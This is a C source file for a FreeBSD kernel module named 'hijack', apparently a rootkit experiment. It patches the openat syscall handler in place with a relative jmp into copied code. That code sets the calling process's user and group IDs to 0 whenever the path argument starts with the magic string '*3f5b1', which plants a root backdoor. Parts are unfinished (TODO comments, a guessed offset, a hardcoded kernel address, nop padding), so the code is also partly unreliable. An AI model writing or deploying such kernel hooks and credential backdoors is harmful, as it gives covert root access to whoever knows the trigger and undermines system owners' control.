#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/pcpu.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/types.h>
#include <sys/malloc.h>
// #include <sys/param.h>
// #include <vm/vm.h>
// #include <vm/vm_param.h>
// #include <vm/pmap.h>
// #include <vm/vm_map.h>
// #include <vm/vm_extern.h>

static int
__attribute__ ((noinline)) dummyret(struct thread *td) {
    return (td == (void *) NULL) ? 1 : 0;
}

static void
__attribute__ ((noinline)) get_pc_ecx() {
    __asm__ volatile ("mov 4(%esp), %ecx");
}

static int
new_sy_call(struct thread *td, void *syscall_args) {

    struct sc_args {
        int fd;
        char *path;
        int flag;
        mode_t mode;
    };

    get_pc_ecx();
    __asm__ volatile ("addl $50, %ecx"); // TODO get exact value to add
    __asm__ volatile ("push %ecx"); // push return address (old_sy_call's return addr)

    __asm__ volatile ("push %ebp");
    __asm__ volatile ("mov  %esp, %ebp");
    __asm__ volatile ("push %edi");
    __asm__ volatile ("push %esi");

    // the following trick jmps to old_sy_call + 5
    // old_sy_call: 0xc0c42820
    __asm__ volatile ("movl 0xc0c42825, %ecx");
    __asm__ volatile ("push %ecx");
    int retval = dummyret(td); // to prevent the rest from being optimized out
    if (retval == 0) {
        __asm__ volatile ("ret");
    }

    // TODO insert jmp to old syscall + 5,
    // when old sys call returns, its retval will be in eax.

    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");

    if (retval != 0) {                                                        
        goto returnlabel;
    }                                                                         

    struct sc_args *args = (struct sc_args *) syscall_args;                   
    char *str = args->path;                                                  

    if (str[0] == '*' &&                                                      
        str[1] == '3' &&                                                      
        str[2] == 'f' &&                                                      
        str[3] == '5' &&                                                      
        str[4] == 'b' &&                                                      
        str[5] == '1') {                                                      

        td->td_ucred->cr_uid =
            td->td_ucred->cr_ruid =
            td->td_ucred->cr_svuid =
            td->td_ucred->cr_gid =
            td->td_ucred->cr_rgid =
            td->td_ucred->cr_svgid =
            0u;
    }

returnlabel:
    return (retval);                                                          
}

static void
p32(uint8_t bytes[], void *addr) {

    uint32_t addr32 = (uint32_t) addr;
    bytes[0] = addr32 & 0xff;
    bytes[1] = (addr32 >> 8) & 0xff;
    bytes[2] = (addr32 >> 16) & 0xff;
    bytes[3] = (addr32 >> 24) & 0xff;
}

static void
craft_jmphook(uint8_t jmphook[], void *src, void *dest) {

    // jump near, relative, displacement relative to next instruction
    jmphook[0] = 0xe9;
    // subtract 5 because this relative jmp is 5 bytes long
    // and the jmp is relative to the next instruction.
    p32(&(jmphook[1]), (void *) ((char *)dest - (char *)src - 5));
}

static void
overwrite_jmphook(uint8_t jmphook[], void *void_addr) {

    char *addr = (char *)void_addr;
    addr[0] = jmphook[0];
    addr[1] = jmphook[1];
    addr[2] = jmphook[2];
    addr[3] = jmphook[3];
    addr[4] = jmphook[4];
}

static int
load(struct module *module, int cmd, void *arg) {

    switch (cmd) {
    case MOD_LOAD: {

        char *old_sy_call = (char *)sysent[SYS_openat].sy_call;
        char *malloc_addr = malloc(1024ul, M_TEMP, M_NOWAIT | M_USE_RESERVE);

        uint8_t jmphook[5];
        craft_jmphook(jmphook, old_sy_call, malloc_addr);
        overwrite_jmphook(jmphook, old_sy_call);

        // copy the instruction bytes in new_sy_call to the malloc region
        char *new_sy_call_addr = (char *)new_sy_call;
        for (unsigned int i = 0; i < 300; i++) {

            // if we hit a page boundary break out because
            // the permissions may not be the same
            if ((unsigned int)(new_sy_call_addr + i) % PAGE_SIZE == 0) {
                break;
            }

            malloc_addr[i] = new_sy_call_addr[i];
        }

        printf("\njmp hook instr bytes: %x %x %x %x %x\n", jmphook[0], jmphook[1], jmphook[2], jmphook[3], jmphook[4]);
        printf("old_sy_call: %p\n", old_sy_call);
        printf("new_sy_call: %p\n", new_sy_call);
        printf("malloc: %p\n", malloc_addr);

        break;
    }

    default:
        break;
    }

    return (0);
}

/* The second argument of DECLARE_MODULE. */
static moduledata_t hijack_mod = {
    "hijack",       /* module name */
    load,           /* event handler */
    NULL            /* extra data */
};

DECLARE_MODULE(hijack, hijack_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
